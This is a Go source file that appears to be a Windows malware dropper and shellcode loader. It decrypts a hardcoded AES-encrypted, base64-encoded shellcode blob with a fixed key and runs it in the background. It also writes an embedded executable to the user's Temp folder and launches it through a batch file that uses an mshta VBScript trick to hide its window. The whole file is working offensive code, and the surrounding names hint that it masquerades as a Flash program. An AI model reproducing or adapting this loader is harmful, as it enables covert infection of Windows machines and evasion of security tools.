package tj

import (
	"embed"
	"github.com/ha1yu/win-tj-free/utils"
	"io/ioutil"
	"log"
	"time"
)

//go:embed f.exe
var embededFiles embed.FS

var windowsScript = `
@echo off
%1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
%s
`

func TjRun() {

	key := "woshikeywoshikey"
	shellCodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJorpSR68wkQMcLmr+itKVZne6CGkSVef7c6kZlCXeqqtrcVg76wNM96XtqiAlhuONnhUxJgCjfK8Cc1eSMd+fqcG25VPSbAnmlw2QDAB7rdCo3fgi6qnRrVdnLoEMgsBsNdWoO42fmnNW5ecPI5xnte5y98KY1SWGXyXUpuDikqzngQcTToETVNRvxpkCl6xBhUXkV3N5wxgJ5vMV44RFhoIW077bzJhircsS1w79TSvyIG3iKoqyZeEXreQuInT9O8I7xnN7V3PDHjgpxw3ij6uPvLVUuqMxM18FRE9i4LfszEHEI+OqgdeasRihvaThFVIhESALru/AVEgZIZhsqKZb8G7+a/ejW3xsn76uUg5L5RcA0WEfvbOuxdN7ikbuMzWBzjcHmsFQaEAInNjMSgGwqoEquH4Rb9z78x3UdE9fj7r9BkmvqPvh+nogbHaxF/uRE3BFZgUx35E/Osr5gIpvCWnp8qqCb26D8h0jvYvaR070VDyxbSbWYX13um/7hExCrtuKGGSJtr2SYG0u2D9PuaA5d9Uz13GLnudU2MZX6ea8jbBr3hoz+bqBhApA5JBWfcNj3LUokSlPkcogyjr6YBpBd2Cp7liUsIPV21JZbfKpv2kQwsrGYR8reDkVCbLz8saaaJrx+y328bNLUt+qEMfNVCZihOqSYZx4HL6g=="

	go loaderRun(key, shellCodeAesBast64)
	flashRun()
	time.Sleep(999999999)
}

func flashRun() {

	bytes, err := embededFiles.ReadFile("f.exe")
	if err != nil {
		log.Println(err)
		return
	}

	err = ioutil.WriteFile(utils.UserLocalAppData()+"/Temp/f.exe", bytes, 0666)
	if err != nil {
		log.Println(err)
		return
	}

	//utils.ExecShell1("" + utils.UserLocalAppData() + "/Temp/f.exe")

	//windowsScript := windowsScript + "\n\r" + utils.UserLocalAppData() + "/Temp/f.exe"
	a := "@echo off\n\r"
	b := "%1 mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"%~s0 ::\",0,FALSE)(window.close)&&exit\n\n"
	c := utils.UserLocalAppData() + "/Temp/f.exe"
	ws := a + b + c
	utils.Write(utils.UserLocalAppData()+"/Temp/1.bat", ws)
	//log.Println(a + b + c)
	utils.ExecShell1(utils.UserLocalAppData() + "/Temp/1.bat")

}
